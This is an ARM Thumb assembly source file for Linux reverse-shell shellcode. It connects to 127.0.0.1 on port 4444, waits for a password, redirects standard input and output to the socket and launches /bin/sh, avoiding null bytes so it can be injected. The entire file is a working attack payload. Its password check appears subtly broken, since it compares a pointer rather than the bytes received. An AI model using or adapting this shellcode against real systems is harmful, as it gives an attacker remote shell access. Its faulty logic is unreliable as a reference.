.section .text
.global _start
_start:

.arm
    add   r3, pc, #1 // switch to thumb mode 
    bx    r3

.thumb

// [281] socket(2, 1, 0) 
    mov   r0, #2
    mov   r1, #1
    eor   r2, r2
    mov   r7, #200
    add   r7, #81
    svc   #1
mov   r10, r0 // save sockfd into r10

// [283] connect(socketfd, &addrstruct, addrlen) 
        // socket fd is in r0 already
        adr   r1, struct
        mov   r2, #16
        add   r7, #2  // 281 + 2 = 283
        svc   #1

// [003] read(sourcefd, destbuffer, amount)
        push  {r1}
        mov   r1, sp
        mov   r2, #32
        mov   r7, #3
        read_pass:
        mov   r0, r10
        svc   #1

// Check password
        ldr   r3, pass
        eor   r3, r1, r3
        bne   read_pass

// [063] dup2(sockfd, stdIO) 
        mov   r1, #2  // r1 = 2 (stderr)
        mov   r7, #63 // r7 = 63 (dup2)
        loop_stdio:
                mov   r0, r10 // r0 = saved sockfd 
                svc   #1
                sub   r1,#1
        bpl   loop_stdio // loop while r3 >= 0 

// [011] execve("/bin/sh", 0, 0) 
        adr   r0, binsh
        eor   r2, r2
        eor   r1, r1
        strb  r2, [r0, #7]
        mov   r7, #11 
        svc   #1

// fix aligment if needed (can't use a nop as it has a null byte)
// nop
// .byte 0xff, 0xff

struct:
        .ascii "\x02\x00" // AF_INET
        .ascii "\x11\x5c" // port 4444 
        .byte 127,0,0,1   // ip

binsh:
        .ascii "/bin/sh?"

pass:
        .ascii "DDDDDDDDAAAAAAAACCCCCCCCBBBBBBBB"
